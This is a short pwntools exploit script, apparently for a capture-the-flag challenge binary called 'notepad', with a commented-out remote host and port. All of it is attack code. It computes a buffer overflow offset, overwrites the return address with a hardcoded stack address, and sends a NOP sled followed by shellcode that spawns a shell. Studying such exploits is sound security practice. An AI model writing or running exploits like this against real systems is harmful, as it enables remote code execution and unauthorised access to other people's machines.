from pwn import *

p = process("./notepad")
# p = remote("140.115.59.7", 11002)
# print(p.recv())
raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
padding = "A" * cyclic_find("naaboaab")
# padding = "A" * cyclic_find("baabcaab")

# RET = p64(0x4004ee)

# RIP = p64(0x4242424243434343)
RIP = p64(0x7ffdb98761d4)

context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.amd64.linux.sh())

NOP = "\x90" * 100

# show_me_magic
# RIP = p64(0x400627)

# frame_dummy
# RIP = p64(0x400620)

p.sendline(padding + RIP + NOP + shellcode)
p.interactive()